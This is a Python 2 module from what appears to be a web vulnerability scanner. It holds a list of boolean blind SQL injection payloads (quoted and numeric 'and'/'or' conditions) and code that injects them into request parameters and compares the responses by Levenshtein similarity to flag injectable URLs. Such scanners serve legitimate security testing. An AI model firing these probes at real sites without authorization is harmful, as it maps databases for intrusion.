# coding=utf-8
import request
import result
import Levenshtein
import copy
import re
import os
import time  


TF_OBJ = (
    #Single quotes
    "' and 7777='7777",
    "' and 0='0",
    "' or 9999='9999",
    "' and 7777='7788",

    #numeric
    " and 7777=7777",
    " and 0=0",
    " or 9999=9999",
    " and 7777=7778",

    #double quotes
    '" and 7777="7777',
    '" and 0="0',
    '" or 7777="7777',
    '" and 7777="7778'
)
class BSqliRspDiff():
    def __init__(self, req, eq_limit=0.98):
        self._req = req
        self._eq_limit = eq_limit
            
    def relative_compare(self, strA, strB):
        '''
            using Levenshtein algorithm to calculate similarity of strA and strB
        '''
        ratio = Levenshtein.ratio(strA,strB)
        if ratio >= self._eq_limit:
            print "\nRatio:%f and result = True"%(ratio)
            return True
        else:
            print "\nRatio:%f and result = False"%(ratio)
            return False
            
    def response_diff(self):
        req = self._req
        #true/false response comparison
        for i in range(len(TF_OBJ)/4):
            trueStm1 = TF_OBJ[i*4]
            trueStm2 = TF_OBJ[i*4+1]
            trueStm3 = TF_OBJ[i*4+2]
            falseStm = TF_OBJ[i*4+3]
            
            trueQueryList1=request.getPayloadQueryList(req._query,trueStm1)
            trueQueryList2=request.getPayloadQueryList(req._query,trueStm2)
            trueQueryList3=request.getPayloadQueryList(req._query,trueStm3)
            falseQueryList=request.getPayloadQueryList(req._query,falseStm)

            for j in range(len(trueQueryList1)):
                tmpReq1 = copy.deepcopy(req)
                tmpReq2 = copy.deepcopy(req)
                tmpReq3 = copy.deepcopy(req)
                tmpReq4 = copy.deepcopy(req)

                tmpReq1._query = trueQueryList1[j] 
                tmpReq2._query = trueQueryList2[j] 
                rsp1 = request.sendRequest(tmpReq1)
                rsp2 = request.sendRequest(tmpReq2)
                cleanRsp = self.relative_compare(rsp1.content,rsp2.content)  
                # cleanRsp = self.compare_response_diff(tmpReq1,tmpReq2)
                
                tmpReq3._query = trueQueryList1[j] 
                tmpReq4._query = falseQueryList[j] 
                rsp3 = request.sendRequest(tmpReq3)
                rsp4 = request.sendRequest(tmpReq4)
                payloadRsp = self.relative_compare(rsp3.content,rsp4.content)  
                # payloadRsp = self.compare_response_diff(tmpReq1,tmpReq2)
                
                if cleanRsp == True and payloadRsp == False:
                    # find vuln and insert record into db
                    # code for insert db    
                    print "*******************************"
                    print "**Find bsqli in:"
                    print "*url:",self._url
                    print "*cleanRsp:",cleanRsp
                    print "*payloadRsp:",payloadRsp
                    print "*******************************"
                    return result.Result([tmpReq1,tmpReq2,tmpReq3,tmpReq4],[rsp1,rsp2,rsp3,rsp4],TF_OBJ[i*4:i*4+4])
                else:
                    tmpReq5 = copy.deepcopy(req)
                    tmpReq6 = copy.deepcopy(req)
                    tmpReq5._query = trueQueryList3[j] 
                    tmpReq6._query = falseQueryList[j] 
                    rsp5 = request.sendRequest(tmpReq5)
                    rsp6 = request.sendRequest(tmpReq6)
                    orRsp = self.relative_compare(rsp5.content,rsp6.content) 
                    if cleanRsp == True and orRsp == False:
                        print "* Find bsqli in:"
                        print "* url:",self._url
                        print "*cleanRsp:",cleanRsp
                        print "*orRsp:",orRsp
                        print "*******************************"                                       
                        return result.Result([tmpReq1,tmpReq2,tmpReq5,tmpReq6],[rsp1,rsp2,rsp5,rsp6],TF_OBJ[i*4:i*4+4]) 

def start(req): 
    bsi = BSqliRspDiff(req)
    return bsi.response_diff()
  
